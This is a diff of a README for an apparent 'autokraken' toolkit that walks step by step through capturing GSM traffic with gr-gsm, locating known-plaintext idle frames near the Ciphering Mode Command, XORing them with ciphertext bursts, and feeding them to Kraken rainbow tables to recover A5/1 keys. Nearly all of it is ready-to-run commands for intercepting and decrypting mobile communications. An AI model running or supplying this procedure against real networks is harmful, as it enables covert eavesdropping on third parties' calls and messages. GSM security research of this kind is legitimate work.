@@ -24,54 +24,51 @@ And of course Kraken with ready to serve rainbow table indexes
 
 ## Introduction
 
-Check that you don't see much after Cipher Mode Command and get the bitstrings at once
+You can separate stage 0,1 and 2 for resp. capturing and cracking.  Simply send the bitstring file from the former to the latter and proceed.
 
-        wireshark -k -Y 'gsmtap' -i lo &
-	grgsm_decode --cfile=$arfcn.cfile --arfcn=$arfcn --mode=SDCCH8 --timeslot=$slot --subslot=$sub \
-		--print-bursts > $arfcn.cfile.${slot}S
+## Stage 0 - capture and get the cfile(s) ready
 
-Also have a look at Timing Advance in case it is not `x00` already.
+	arfcn=
 
-You can separate stage 1 and 2 for resp. capturing and cracking.  Simply send the bitstring file from the former to the latter to proceed.
+	./capture.bash $arfcn
 
-## Stage 1 - define your known plain-text
+## Stage 1 - define known plain-text frame
 
 _requires GR-GSM and a cfile_
 
-Seeking for idle frames
-
-        cd /root/KRAKEN/autokraken/stage1/
-	arfcn=
-        cfile=/root/capture/$arfcn.cfile
-	ls -lF $cfile
-
 Extract 0C and find out about the SDCCH timeslot (TODO: and subchannel)
 
-	./json0C $cfile $arfcn
+        cfile=/root/capture/$arfcn.cfile
+
+        cd /root/KRAKEN/autokraken/stage1/
+	./json0C $arfcn
 	./parse.py 0C $cfile.0C.json
 
 	slot=1
 
 Look for idling frames around the Ciphering Mode Command
 
-	./jsonXS $cfile $arfcn $slot
+	./jsonXS $arfcn $slot
+
+If you don't find the CMC it might be because there's hopping going on.  Look closer at the IA and hopping friends in SI1.
+
+Now seek for the last known idle frame
+
 	./parse.py XS $cfile.${slot}S.json
 
 	plainframe=
 
-Obsolete - produce the burst bitstrings with frame references (it's already there)
-
-        #./bitstringsXS $cfile $arfcn $slot
-        ls -lF $cfile.${slot}S
+Also have a look at Timing Advance in case it is not `x00` already.
 
 Eventually send the bitstring file to the Kraken server.
 
 	scp $cfile.${slot}S kraken:/root/capture/
 
-## Stage 2 - define your target cipher-text
+## Stage 2 - define the cipher-text frames
 
 _requires Kraken and the bitstring file_
 
+	screen -S KRAKEN
 	cd /root/KRAKEN/autokraken/stage2/
 	string=/root/capture/$arfcn.cfile.1S
 	echo $plainframe
@@ -87,15 +84,14 @@ XOR plain bitstrings with cipher bitstrings
 	#./getemptyframeplain $cfile.${slot}S $plainframe
 	#./getemptyframecipher $cfile.${slot}S $plainframe
 	./feedemptyframe $string $plainframe
-	ls -lF /root/capture/$arfcn.cfile.1S.*.emptyframe*
+	ls -lhF /root/capture/$arfcn.cfile.1S.*.emptyframe*
 
 Feed those into Kraken interactivelty
 
-	ls -lF /dev/sdb2
-	ls -lF /root/KRAKEN/kraken/indexes/
-	head /root/capture/66.hrf.cfile.1S.816538.emptyframe234
+	ls -lhF /dev/sdb2
+	ls -lhF /root/KRAKEN/kraken/indexes/
+	head /root/capture/$arfcn.cfile.${slot}S.$plainframe.emptyframe234
 
-	screen -S KRAKEN
 	cd /root/KRAKEN/kraken/Kraken/
 	./kraken ../indexes
 
@@ -104,7 +100,7 @@ Feed those into Kraken interactivelty
 ## Stage 2 semi-automated
 
         cd /root/KRAKEN/kraken/Kraken/
-        ./kraken ../indexes < /root/capture/$arfcn.cfile.1S.$plainframe.emptyframe234
+        ./kraken ../indexes < /root/capture/$arfcn.cfile.${slot}S.$plainframe.emptyframe234
 
 ## Stage 2 automated
 
